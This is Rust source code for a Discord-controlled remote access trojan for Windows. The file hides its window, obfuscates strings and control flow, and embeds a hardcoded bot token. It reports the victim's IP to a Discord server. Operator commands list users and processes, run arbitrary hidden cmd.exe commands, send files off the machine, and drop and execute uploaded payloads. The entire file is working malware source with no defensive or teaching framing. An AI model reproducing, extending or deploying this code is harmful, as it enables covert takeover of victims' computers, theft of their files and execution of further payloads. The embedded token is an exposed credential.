#![windows_subsystem = "windows"]

#[macro_use]
extern crate litcrypt;
use_litcrypt!();

use std::{os::windows::process::CommandExt, process::Command, sync::RwLock, time::Duration};
use std::path::PathBuf;

use serenity::{
    async_trait,
    client::Context,
    framework::standard::{
        macros::{command, group},
        CommandResult, StandardFramework,
    },
    model::{
        application::interaction::InteractionResponseType,
        channel::{ChannelType, Message},
        gateway::Ready,
        id::ChannelId,
    },
    prelude::*,
};

use chrono::Utc;
use goldberg::{goldberg_stmts};
use serenity::framework::standard::Args;
use uuid::Uuid;

mod commands;

use commands::recon::*;

mod utils;

use utils::utils::*;

static CHANNEL_NAME: RwLock<Option<Uuid>> = RwLock::new(None);
static CAT_ID: RwLock<Option<ChannelId>> = RwLock::new(None);
static COMMAND_ID: RwLock<Option<ChannelId>> = RwLock::new(None);
static SESSION_ID: RwLock<Option<ChannelId>> = RwLock::new(None);

#[group("info")]
#[commands(c_userlist, c_tasklist, c_whoami)]
struct Info;

#[group("cmd_session")]
#[commands(cmdsesh, run, download_file, upload_file)]
struct CmdSession;

#[group("general")]
#[commands(clear, exit)]
struct General;

#[tokio::main]
async fn main() {
    // Configure the client with your Discord bot token in the environment.
    let token = String::from(lc!(
        "MTA4NzQ2MzExMjY3ODA1NTkzNg.Gf19_l.w7FqiCApRPbPZWws6YVdRjUaT4jx7Ap_zJWlrY"
    ));

    // Set gateway intents, which decides what events the bot will be notified about
    let intents = GatewayIntents::GUILD_MESSAGES
        | GatewayIntents::DIRECT_MESSAGES
        | GatewayIntents::MESSAGE_CONTENT;

    let framework = StandardFramework::new()
        .configure(|c| c.prefix("!")) // Set the bot's command prefix
        .group(&GENERAL_GROUP)
        .group(&CMDSESSION_GROUP)
        .group(&INFO_GROUP);

    // Create our client object with the token and intents, throws error if building the client.
    let mut client = Client::builder(&token, intents)
        .event_handler(Handler)
        .framework(framework)
        .await
        .expect("Error when creating the client");

    if let Err(why) = client.start().await {
        println!("Client error: {:?}", why);
    }
}

struct Handler;

#[async_trait]
impl EventHandler for Handler {
    async fn ready(&self, ctx: Context, ready: Ready) {
        println!("{} is connected!", ready.user.name);

        match get_or_create_uuid() {
            Ok(uuid) => {
                println!("UUID: {:?}", uuid);
                *CHANNEL_NAME.write().unwrap() = Some(uuid);
            }
            Err(e) => {
                eprintln!("Error creating file: {:?}", e);
                std::process::exit(1);
            }
        };

        // Create a text channel in the first guild the bot is connected to
        let guilds = &ready.guilds;
        if let Some(guild_id) = guilds.first().map(|g| g.id) {
            println!("GUILD ID: {:?}", guild_id);
            *CAT_ID.write().unwrap() = get_category_uuid(&ctx, Some(guild_id)).await;

            if let Err(why) = whatsip(&ctx).await {
                println!(
                    "{} {}",
                    lc!("Ran into error when sending ip sadly: {}"),
                    why
                );
            };
        }
    }
}

#[command]
#[aliases("userlist")]
async fn c_userlist(ctx: &Context, msg: &Message) -> CommandResult {
    match is_designated_channel(msg) {
        Ok(true) => {
            if let Err(why) = msg.channel_id.say(&ctx.http, userlist()).await {
                eprintln!("Error sending message: {:?}", why);
            }
        }
        Ok(false) => {}
        Err(why) => {
            if let Err(why) = msg.channel_id.say(&ctx.http, why).await {
                eprintln!("Error sending message: {:?}", why);
            }
        }
    }

    Ok(())
}

#[command]
#[aliases("tasklist")]
async fn c_tasklist(ctx: &Context, msg: &Message) -> CommandResult {
    match is_designated_channel(msg) {
        Ok(true) => {
            let tasklist_str = tasklist();
            let chunks = split_tasklist(&tasklist_str, 1900); // Discord has a 2000 character limit per message; 1900 gives some buffer

            for chunk in chunks {
                if let Err(why) = msg.channel_id.say(&ctx.http, &chunk).await {
                    eprintln!("Error sending message: {:?}", why);
                }
            }
        }
        Ok(false) => {}
        Err(why) => {
            if let Err(why) = msg.channel_id.say(&ctx.http, why).await {
                eprintln!("Error sending message: {:?}", why);
            }
        }
    }

    Ok(())
}

#[command]
#[aliases("whoami")]
async fn c_whoami(ctx: &Context, msg: &Message) -> CommandResult {
    match is_designated_channel(msg) {
        Ok(true) => {
            if let Err(why) = msg.channel_id.say(&ctx.http, whoami()).await {
                eprintln!("Error sending message: {:?}", why);
            }
        }
        Ok(false) => {}
        Err(why) => {
            if let Err(why) = msg.channel_id.say(&ctx.http, why).await {
                eprintln!("Error sending message: {:?}", why);
            }
        }
    }

    Ok(())
}

#[command]
async fn cmdsesh(ctx: &Context, msg: &Message) -> CommandResult {
    if is_designated_channel(msg)? {
        goldberg_stmts! {
            let sent_message = msg
            .channel_id
            .send_message(&ctx.http, |m| {
                m.content(lc!("Are you sure you want to open a command session?"))
                    .components(|c| {
                        c.create_action_row(|row| {
                            row.create_select_menu(|menu| {
                                menu.custom_id("session_dialog");
                                menu.placeholder("OPTIONS");
                                menu.options(|f| {
                                    f.create_option(|o| o.label("✅ Yes").value("Yes"));
                                    f.create_option(|o| o.label("❌ No").value("No"))
                                })
                            })
                        })
                    })
            })
            .await
            .unwrap();

        let interaction = match sent_message
            .await_component_interaction(&ctx)
            .timeout(Duration::from_secs(60 * 3))
            .await
        {
            Some(x) => x,
            None => {
                sent_message.reply(&ctx, "Timed out").await.unwrap();
                return Ok(());
            }
        };

        let decision = &interaction.data.values[0];

        if decision == "Yes" {
            sent_message.delete(&ctx).await.unwrap();

            let guild_id = msg.guild_id.unwrap();
            let category_id = CAT_ID.read().unwrap().unwrap();

            let session_channel = guild_id
                .create_channel(&ctx.http, |c| {
                    c.name(format!("session ({})", Utc::now())).kind(ChannelType::Text).category(category_id).topic(lc!("This is an interactive session with the agent. To exit the session and close this channel, please try '!exit'."))
                })
                .await
                .unwrap();
            *SESSION_ID.write().unwrap() = Option::from(session_channel.id);

            interaction
                .create_interaction_response(&ctx, |r| {
                    r.kind(InteractionResponseType::ChannelMessageWithSource)
                        .interaction_response_data(|d| {
                            d.ephemeral(true)
                                .content(format!("{} {}", lc!("Please see the following channel for your command session:"), session_channel.mention()))
                        })
                })
                .await
                .unwrap();
        } else if decision == "No" {
            interaction
                .create_interaction_response(&ctx, |r| {
                    r.kind(InteractionResponseType::ChannelMessageWithSource)
                        .interaction_response_data(|d| {
                            d.ephemeral(true)
                                .content("User denied session creation")
                        })
                })
                .await
                .unwrap();
            sent_message.delete(&ctx).await.unwrap();
        }
        }
    }

    Ok(())
}

#[command]
async fn run(ctx: &Context, msg: &Message) -> CommandResult {
    if session_handler(msg)? {
        goldberg_stmts! {
            let command = msg.content.clone();
        let command_stripped = command.strip_prefix("!run ").unwrap_or(&command);

        let output = Command::new(lc!("cmd.exe"))
            .arg("/c")
            .arg(&command_stripped)
            .creation_flags(0x08000000)
            .output()
            .expect("failed to execute process");

        let output_string = match std::str::from_utf8(&output.stdout) {
            Ok(s) => s.to_owned(),
            Err(e) => {
                println!("Failed to parse output: {:?}", e);
                String::new()
            }
        };

        println!("Output: {}", output_string);

        let mut chunks = output_string.chars().collect::<Vec<char>>();
        while !chunks.is_empty() {
            let chunk = chunks.drain(..1950.min(chunks.len())).collect::<String>();
            let send_result = msg.channel_id.say(&ctx.http, format!("```cmd\n\
            {}```",chunk)).await;
            if let Err(e) = send_result {
                println!("Failed to send message: {:?}", e);
            }
        }
        }
    }
    Ok(())
}

#[command]
async fn download_file(ctx: &Context, msg: &Message) -> CommandResult {
    if session_handler(msg)? {
        let command = msg.content.clone();
        let command_stripped = command.strip_prefix("!download_file ").unwrap_or(&command);
        let file_path = PathBuf::from(format!(r"{}", command_stripped));
        if let Err(why) = msg.channel_id.send_message(&ctx, |m|
            m.content("Requested file:\n").add_file(&file_path),
        ).await {
            msg.channel_id.say(&ctx, format!("```diff\n\
            - {}```", why.to_string())).await.ok();
            eprintln!("Error sending message: {:?}", why);
        };
    }
    Ok(())
}

#[command]
async fn upload_file(ctx: &Context, msg: &Message, mut args: Args) -> CommandResult {
    if session_handler(msg)? {
        // Parse the optional arguments
        let mut file_path = None;
        let mut execute = false;
        while !args.is_empty() {
            match args.single::<String>().unwrap().as_str() {
                "-p" => {
                    file_path = Some(args.single::<String>()?);
                }
                "-execute" => {
                    execute = args.single::<bool>()?;
                }
                _ => {}
            }
        }

        let attachments = match get_message_attachments(&ctx, msg).await {
            Ok(attachments) => attachments,
            Err(why) => {
                println!("Error: {}", why);
                return Ok(());
            }
        };

        let created_file_path = match file_handler(attachments, &file_path).await {
            Ok(file_path) => {
                if let Err(why) = msg.channel_id.say(&ctx, format!("Successfully wrote file to disk. Location: {}", file_path.to_str().unwrap())).await {
                    eprintln!("Error when sending success message for file_handler: {}", why);
                }
                file_path
            }
            Err(why) => {
                if let Err(why) = msg.channel_id.say(&ctx, format!("Was not able to write to the disk. Reason: {}", why)).await {
                    eprintln!("Disk write error: {}", why);
                    return Ok(());
                }
                PathBuf::new()
            }
        };

        if execute {
            match execution_handler(created_file_path).await {
                Ok(()) => {
                    if let Err(why) = msg.channel_id.say(&ctx, format!("Successfully executed the file!")).await {
                        eprintln!("Error when sending success message for execute_handler: {}", why);
                    }
                }
                Err(why) => {
                    if let Err(why) = msg.channel_id.say(&ctx, format!("Ran into an error when attempting to execute the file. Reason: {}", why)).await {
                        eprintln!("Execution error: {}", why);
                        return Ok(());
                    }
                }
            }
        }
    }
    Ok(())
}

#[command]
async fn exit(ctx: &Context, msg: &Message) -> CommandResult {
    match session_handler(msg) {
        Ok(true) => {
            if let Err(why) = msg.channel_id.say(&ctx.http, "Closing session....").await {
                eprintln!("Error sending message: {:?}", why);
            }
            let channel_id = SESSION_ID.read().unwrap().unwrap();
            channel_id
                .delete(&ctx)
                .await
                .expect("Error deleting the channel");
        }
        Ok(false) => {}
        Err(why) => {
            if let Err(why) = msg.channel_id.say(&ctx.http, why).await {
                eprintln!("Error sending message: {:?}", why);
            }
        }
    }
    Ok(())
}

#[command]
async fn clear(ctx: &Context, msg: &Message) -> CommandResult {
    let channel_id = msg.channel_id;
    let mut messages = channel_id
        .messages(&ctx.http, |retriever| retriever.limit(100))
        .await?;

    while !messages.is_empty() {
        channel_id.delete_messages(&ctx.http, &messages).await?;

        // Fetch the next batch of messages
        messages = match channel_id
            .messages(&ctx.http, |retriever| {
                retriever.limit(100).before(messages.last().unwrap().id)
            })
            .await
        {
            Ok(batch) if !batch.is_empty() => batch,
            _ => break,
        };
    }

    Ok(())
}
